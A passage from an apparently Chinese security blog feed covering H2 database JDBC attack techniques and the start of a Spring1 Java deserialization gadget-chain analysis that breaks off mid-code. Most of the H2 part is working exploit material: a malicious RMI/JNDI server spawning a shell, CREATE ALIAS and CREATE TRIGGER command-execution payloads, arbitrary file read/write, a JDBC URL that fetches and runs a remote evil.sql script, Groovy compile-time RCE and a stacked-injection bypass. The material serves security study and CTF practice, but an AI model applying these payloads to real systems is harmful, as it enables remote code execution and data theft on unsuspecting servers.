class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8025</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;touch /tmp/h2-jndi-success&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用BeanFactory本地工厂类实现的JNDI，H2是支持的。</p><p><img src="/2024/08/13/JDBC/image-20240813180357092.png" alt="image-20240813180357092"></p><p>高版本的H2只允许JNDI lookup的URL以java开头：</p><p><img src="/2024/08/13/JDBC/image-20240813180414155.png" alt="image-20240813180414155"></p><p>而在H2的函数文档中能发现一处可能造成JNDI注入的：<code>LINK_SCHEMA</code></p><p><a href="http://www.h2database.com/html/functions.html#link_schema">http://www.h2database.com/html/functions.html#link_schema</a></p><p><img src="/2024/08/13/JDBC/image-20240813180443447.png" alt="image-20240813180443447"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> LINK_SCHEMA(<span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;javax.naming.InitialContext&#x27;</span>, <span class="hljs-string">&#x27;rmi://127.0.0.1:8025/evil&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;PUBLIC&#x27;</span>);<br></code></pre></td></tr></table></figure><p>同样高版本对URL进行了限制，只允许java开头</p><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2-RCE"></a>H2-RCE</h3><h4 id="UDF执行"><a href="#UDF执行" class="headerlink" title="UDF执行"></a>UDF执行</h4><ul><li><code>CREATE ALIAS</code></li></ul><p>自定义函数</p><p>创建一个shell函数并调用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> ALIAS IF <span class="hljs-keyword">EXISTS</span> shell;<br><span class="hljs-keyword">CREATE</span> ALIAS shell <span class="hljs-keyword">AS</span> $$void shell(String s) throws Exception &#123;<br>java.lang.Runtime.getRuntime().<span class="hljs-keyword">exec</span>(s);<br>&#125;$$;<br><span class="hljs-keyword">SELECT</span> shell(<span class="hljs-string">&#x27;cmd /c calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>h2中两个<code>$</code>表示无需转义的长字符串</p><p>对比高版本的H2，<code>handleSyntaxError</code>多传了一个参数，若第二个参数是0则直接返回，不进行语法错误处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">handleSyntaxError*(output, (ok? <span class="hljs-number">0</span>: <span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>那如果遇上目标用了lombok还是H2低版本呢?只能考虑调用目标本地的静态公开方法</p><p>如<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code>有两个读写文件的静态公开方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS read <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromFile&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> read(<span class="hljs-string">&#x27;E:/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><p>读出来的结果为byte数组，还得转为字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = &#123;<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>&#125;;<br>System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));  <span class="hljs-comment">// 打印here is my flag</span><br></code></pre></td></tr></table></figure><p>虽然<code>writeBytesToFilename</code>第二个参数要求为byte数组，但传字符串也行，H2能够自动转换。或者在十六进制字符串前面加个X。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS write <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/success.txt&#x27;</span>, <span class="hljs-string">&#x27;Arbitrary File Write&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/wirte_hex.txt&#x27;</span>, X<span class="hljs-string">&#x27;68657265206973206d7920666c6167&#x27;</span>)<br></code></pre></td></tr></table></figure><p>当然还有其他静态方法可以利用，比如</p><ul><li><code>java.sql.DriverManager#getConnection</code> 连接恶意MySQL服务器</li><li><code>javax.naming.InitialContext#doLookup</code> JNDI注入</li><li><code>com.alibaba.fastjson.JSON#parseObject</code> FastJson反序列化</li><li><code>org.springframework.util.SerializationUtils.deserialize</code> 二次反序列化</li></ul><h4 id="js执行"><a href="#js执行" class="headerlink" title="js执行"></a>js执行</h4><ul><li><code>CREATE TRIGGER</code></li></ul><p>这个命令稍微麻烦一点，利用的是触发器，即增删改时会触发一些动作，需要新建一张表，或者需要有已知表。</p><p>下面上网上流传的poc：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hack (<br>     id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS AFTER <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> hack <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;</span>;<br> <br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hack <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>但实际上创建触发器时那段js代码就被执行了，后面插入数据也没有执行</p><p>好在这句创建触发器的语句可以多次执行(因为根本没创建成功)</p><p>为什么呢？因为这段js代码本意是用来返回一个<code>Trigger</code>对象的</p><p>查看官方文档<a href="https://www.h2database.com/html/commands.html#create_trigger">https://www.h2database.com/html/commands.html#create_trigger</a></p><blockquote><p>The trigger class must be public and implement <code>org.h2.api.Trigger</code>. Inner classes are not supported. The class must be available in the classpath of the database engine (when using the server mode, it must be in the classpath of the server).</p><p>The sourceCodeString must define a single method with no parameters that returns <code>org.h2.api.Trigger</code>. See <code>CREATE ALIAS</code> for requirements regarding the compilation. Alternatively, javax.script.ScriptEngineManager can be used to create an instance of <code>org.h2.api.Trigger</code>. Currently javascript (included in every <code>JRE</code>) and ruby (with <code>JRuby</code>) are supported. In that case the source must begin respectively with <code>//javascript</code> or <code>#ruby</code>.</p><p>Example:</p><p>CREATE TRIGGER TRIG_INS BEFORE INSERT ON TEST FOR EACH ROW CALL ‘MyTrigger’;</p><p>CREATE TRIGGER TRIG_SRC BEFORE INSERT ON TEST AS ‘org.h2.api.Trigger create() { return new MyTrigger(“constructorParam”); }’;</p><p>CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS ‘&#x2F;&#x2F;javascript return new Packages.MyTrigger(“constructorParam”);’;</p><p>CREATE TRIGGER TRIG_RUBY BEFORE INSERT ON TEST AS ‘#ruby Java::MyPackage::MyTrigger.new(“constructorParam”)’;</p></blockquote><p>可以用<code>javax.script.ScriptEngineManager</code>来创建一个<code>org.h2.api.Trigger</code>实例</p><p><code>org.h2.schema.TriggerObject#loadFromSource</code></p><p><img src="/2024/08/13/JDBC/image-20240813181204143.png" alt="image-20240813181204143"></p><p>判断是否为js或ruby脚本</p><p><img src="/2024/08/13/JDBC/image-20240813181216278.png" alt="image-20240813181216278"></p><p>简单判断是否以<code>//javascript</code>开头</p><p><img src="/2024/08/13/JDBC/image-20240813181226959.png" alt="image-20240813181226959"></p><p>然后就是经典的<code>new ScriptEngineManager().getEngineByName(&quot;javascript&quot;)</code></p><p><img src="/2024/08/13/JDBC/image-20240813181240153.png" alt="image-20240813181240153"></p><p>返回<code>CompiledScript</code>调用其<code>eval</code></p><p>低版本H2(1.4.200之前)貌似不支持js脚本，没有<code>isJavascriptSource</code>这段代码。</p><h4 id="出网利用——init-runscript"><a href="#出网利用——init-runscript" class="headerlink" title="出网利用——init+runscript"></a>出网利用——init+runscript</h4><p>上面这些操作的利用前提都是h2 console成功连接到数据库。</p><p>低版本H2(<code>1.4.193</code>左右)当连接的数据库不存在时会自动创建，但高版本就不行了</p><p>会报错<code>Database &quot;mem:test&quot; not found.either pre-create it or allow remote database creation</code></p><p>要么连接Springboot中<code>spring.datasource.url</code>指明的数据库，要么需要启动console时带上<code>-ifNotExists</code>参数</p><p>因此能否不连接进去就能执行命令呢?</p><p>h2数据库的JDBC URL中支持的一个配置<code>INIT</code></p><p>这个参数表示在连接h2数据库时，会执行一条初始化命令。不过只支持执行一条命令，而且不能包含分号<code>;</code></p><p>上面<code>CREATE ALIAS</code>用于命令执行的SQL语句都不止一条。可以利用<code>RUNSCRIPT</code>命令。<code>RUNSCRIPT</code>用于执行一个SQL文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM <span class="hljs-string">&#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></code></pre></td></tr></table></figure><p>这个方法能用在任何能配置JDBC URL且依赖了H2的地方</p><p><img src="/2024/08/13/JDBC/image-20240813181326106.png" alt="image-20240813181326106"></p><p>然后就可以URL远程加载恶意类了。</p><h4 id="不出网利用——init-groovy"><a href="#不出网利用——init-groovy" class="headerlink" title="不出网利用——init+groovy"></a>不出网利用——init+groovy</h4><p>JDBC连接时<code>INIT</code>只允许执行一条SQL命令，而我们的命令执行有两句，一句创建UDF，一句执行UDF</p><p>除非有已知表，使用<code>CREATE TRIGGER</code>就只需一句。实际上可以利用H2的系统表，H2和MySQL一样也有<code>INFORMATION_SCHEMA</code></p><blockquote><p>The system tables and views in the schema <code>INFORMATION_SCHEMA</code> contain the meta data of all tables, views, domains, and other objects in the database as well as the current settings.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>需要注意的是，H2提取URL中的配置时是通过分割分号<code>;</code>来提取的，因此JS代码中不能有分号，否则会报错（可以加上反斜杠代表转义）</p><p><img src="/2024/08/13/JDBC/image-20240813181406492.png" alt="image-20240813181406492"></p><p>若目标环境有<code>Groovy</code>依赖，可以使用元编程的技巧来命令执行，在编译<code>Groovy</code>语句而非执行时就执行攻击者的代码。</p><p>添加<code>groovy-sql</code>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy-sql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS<br>$$<span class="hljs-meta">@groovy</span>.transform.ASTTest(value=&#123;<br><span class="hljs-keyword">assert</span> java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>)<br>&#125;)<br>def x$$<br></code></pre></td></tr></table></figure><h4 id="SQLI-2-RCE"><a href="#SQLI-2-RCE" class="headerlink" title="SQLI 2 RCE"></a>SQLI 2 RCE</h4><p>可见<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18015760">HGAME week2-web wp - Eddie_Murphy - 博客园 (cnblogs.com)</a>的SearchVmenber那道题。</p><p><code>INIT</code>参数可以直接在连接数据库时执行初始化的sql语句</p><p>除了<code>INIT</code>参数，一些参数在连接数据库时会执行SET命令，存在SQL注入</p><p>比如<code>TRACE_LEVEL_SYSTEM_OUT</code>、<code>TRACE_MAX_FILE_SIZE</code>……</p><p><img src="/2024/08/13/JDBC/image-20240813181531078.png" alt="image-20240813181531078"></p><p><code>org.h2.engine.Engine#openSession</code>会对我们传入的参数进行<code>SET</code>语句拼接</p><p><img src="/2024/08/13/JDBC/image-20240813181544236.png" alt="image-20240813181544236"></p><p>开始尝试堆叠注入</p><h4 id="坑：semicolon分割之痛"><a href="#坑：semicolon分割之痛" class="headerlink" title="坑：semicolon分割之痛"></a>坑：semicolon分割之痛</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure><p>这个payload并不能打通，还得看它是怎么提取setting参数的</p><p><code>org.h2.engine.ConnectionInfo#readSettingsFromURL</code> 这个类用于存储连接信息</p><p><img src="/2024/08/13/JDBC/image-20240813181602835.png" alt="image-20240813181602835"></p><p>问题就出在这，我们用于堆叠注入的分号<code>;</code>，同时也是H2用来提取设置参数的分隔符。。。🥲</p><p>但要是settings的值本来就存在分号怎么办，照理是会提供转义的，跟进<code>StringUtils.arraySplit</code>一探究竟</p><p><img src="/2024/08/13/JDBC/image-20240813181626818.png" alt="image-20240813181626818"></p><p>果然是支持反斜杠转义的。因此在payload中分号前面加上<code>\</code>即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">1</span>\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>基本纯抄的，因为分析起来太费劲了，尤其是配环境之类的…以前的环境找不到了就又偷个懒。</p><p>这里简单介绍了H2的JDBC攻击方法，在JDBC URL可控的情况下（不局限于h2 web console）</p><ul><li>JNDI注入（高版本限制了只能是java协议）</li><li>利用init参数执行<code>RUNSCRIPT</code>命令加载执行远程恶意SQL</li><li>利用init参数直接执行<code>groovy</code>元编程代码（不出网）</li><li>利用其他连接参数进行堆叠注入</li></ul><p>当然若能直接连接上去，就能直接UDF命令执行了。</p><p>而对于h2 web console，利用方式会受到一些限制：</p><ul><li>需要开启<code>-webAllowOthers</code>选项，支持外部连接</li><li>需要开启<code>-ifNotExists</code>选项，支持创建数据库</li></ul><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/jdbc-attack/h2#springboot-zheng-he">H2 JDBC Attack | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2024/08/12/Spring/"/>
    <url>/2024/08/12/Spring/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没啥好说的，看看吧。</p><h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-beans<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="MethodInvokeTypeProvider"><a href="#MethodInvokeTypeProvider" class="headerlink" title="MethodInvokeTypeProvider"></a>MethodInvokeTypeProvider</h3><p>切入点在 <code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodInvokeTypeProvider</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeProvider</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TypeProvider provider;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String methodName;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> index;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Object result;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MethodInvokeTypeProvider</span><span class="hljs-params">(TypeProvider provider, Method method, <span class="hljs-type">int</span> index)</span> &#123;<br>        <span class="hljs-built_in">this</span>.provider = provider;<br>        <span class="hljs-built_in">this</span>.methodName = method.getName();<br>        <span class="hljs-built_in">this</span>.index = index;<br>        <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        inputStream.defaultReadObject();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br>        <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>readObject</code>会调用<code>this.provider.getType()</code>返回对象的<code>this.methodName</code>指定的方法，这里<code>ReflectionUtils.findMethod</code>和<code>ReflectionUtils.invokeMethod</code>都没有传递<code>Method</code>的参数，因此是无参方法和无参调用。</p><p>我们的目标是让<code>this.MethodName</code>为<code>newTransformer</code>或<code>getOutputProperties</code>（这两个都是public方法，<code>findMethod</code>和<code>invokeMethod</code>都没有设置<code>Method</code>的可访问性），让<code>this.provider.getType()</code>返回<code>TemplatesImpl</code>。</p><p>这个可以通过动态代理实现，先介绍几个调用处理器。</p><h3 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h3><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectFactoryDelegatingInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectFactoryDelegatingInvocationHandler</span><span class="hljs-params">(ObjectFactory&lt;?&gt; objectFactory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.objectFactory = objectFactory;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();<br>        <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;equals&quot;</span>)) &#123;<br>            <span class="hljs-comment">// Only consider equal when proxies are identical.</span><br>            <span class="hljs-keyword">return</span> (proxy == args[<span class="hljs-number">0</span>]);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>            <span class="hljs-comment">// Use hashCode of proxy.</span><br>            <span class="hljs-keyword">return</span> System.identityHashCode(proxy);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.objectFactory.toString();<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.objectFactory.getObject(), args);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>            <span class="hljs-keyword">throw</span> ex.getTargetException();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>invoke中会把方法调用委派给<code>objectFactory#getObject()</code>获取到的对象。</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>老朋友了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>  